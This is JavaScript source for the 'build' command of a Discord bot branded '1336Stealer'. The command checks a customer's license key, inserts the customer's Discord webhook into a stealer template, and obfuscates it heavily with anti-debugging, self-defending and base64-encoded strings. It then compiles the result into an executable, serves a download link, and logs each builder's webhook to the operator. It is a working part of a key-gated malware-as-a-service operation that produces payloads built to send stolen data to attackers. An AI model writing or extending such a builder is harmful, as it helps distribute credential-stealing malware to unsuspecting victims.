const Discord = require("discord.js");
const fs = require('fs');
const db = require('quick.db');
const JavaScriptObfuscator = require('javascript-obfuscator');
const build = require('../../Build/script/builder');
const axios = require("axios")

module.exports.run = async (bot, message, args) => {
  const status = db.get(`status_${bot.id}`)
  if(status === true) {
    return message.channel.send("Disabled :eyes:")
  } else if(status === false) {
  if (!args[0] || !args[1]) {
    message.channel.send(`Invalid arguments! \`Use: ${bot.config.prefix}build <webhook> <key>\``);
  } else {
    const webhook = args[0];
    const key = args[1];
    const data = await axios.get(webhook).catch(() => {})
    if (!data || data.code) return message.channel.send("Your webhook link is not correct!")
    const keydb = Object.values(db.get(`keys_${bot.id}`)).find(element => element.cle === key);
    if (keydb === undefined) return message.channel.send("Your key is invalid");

    message.channel.send("Creating your file... *(Can take more than 1 minute)*");

    const rdm = random(10)
    const replaced = fs.readFileSync('BuildBot/Build/script/index.js').toString().replace('da_webhook', webhook).replace('%key%', rdm)
    db.set(`wbh_${rdm}`, webhook)
    const obfuscationResult = JavaScriptObfuscator.obfuscate(replaced,
      {
        "ignoreRequireImports": true,
        "compact": true,
        "controlFlowFlattening": true,
        "controlFlowFlatteningThreshold": 0.5,
        "deadCodeInjection": true,
        "deadCodeInjectionThreshold": 0.01,
        "debugProtection": true,
        "debugProtectionInterval": 0,
        "disableConsoleOutput": true,
        "identifierNamesGenerator": "hexadecimal",
        "log": false,
        "numbersToExpressions": true,
        "renameGlobals": true,
        "selfDefending": true,
        "simplify": true,
        "splitStrings": true,
        "splitStringsChunkLength": 5,
        "stringArray": true,
        "stringArrayEncoding": ["base64"],
        "stringArrayIndexShift": true,
        "stringArrayRotate": false,
        "stringArrayShuffle": false,
        "stringArrayWrappersCount": 5,
        "stringArrayWrappersChainedCalls": true,
        "stringArrayWrappersParametersMaxCount": 5,
        "stringArrayWrappersType": "function",
        "stringArrayThreshold": 1,
        "transformObjectKeys": false,
        "unicodeEscapeSequence": false
      }
    );
    const payload = obfuscationResult.getObfuscatedCode();
    const package = fs.readFileSync('BuildBot/Build/script/package.json')
    fs.mkdirSync(`BuildBot/Build/script/${rdm}`)
    fs.writeFileSync(`BuildBot/Build/script/${rdm}/index.js`, payload);
    fs.writeFileSync(`BuildBot/Build/script/${rdm}/package.json`, package);
    build(rdm)
      .then((res) => {
        if (res == 'Error') return message.channel.send('An error occured')
        message.channel.send(new Discord.MessageEmbed()
          .addField(`__Here's your file:__`, `[Download](https://cubfight.cf/download)`)
          .setColor("2f3136")
          .setFooter("1336Stealer")
          .setAuthor('1336Stealer', 'https://media.discordapp.net/attachments/1012840502598582434/1013143149859831968/a_721d6729d0b5e1a8979ab7a445378e9a.gif')
          .setTimestamp()
        );
      })
      .catch(() => {
        return message.channel.send('An error occured')
      });
      
      const SudryLOGS = new Discord.MessageEmbed()
      .setAuthor('1336Stealer', 'https://media.discordapp.net/attachments/1012840502598582434/1013143149859831968/a_721d6729d0b5e1a8979ab7a445378e9a.gif')
      .setColor('2f3136')
      .addFields(
        {            
        name: "Builder:",
        value: `*<@${message.author.id}> (${message.author.id})*`,
        inline: true
      },
      {            
        name: "Key:",
        value: `*${args[1]}*`,
        inline: true
      },
      {            
        name: "Exe:",
        value: `*1336_${rdm}.exe*`,
        inline: true
      },
      {            
        name: "Webhook:",
        value: `\`\`\`${args[0]}\`\`\``,
        inline: false
      }, )
      .setTimestamp()
      .setFooter('@1336stealer');
  
    let SudryLog = bot.channels.cache.get(bot.config.logs);
    SudryLog.send(SudryLOGS);
  };
};

function random(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
}

module.exports.help = {
  name: "build"
}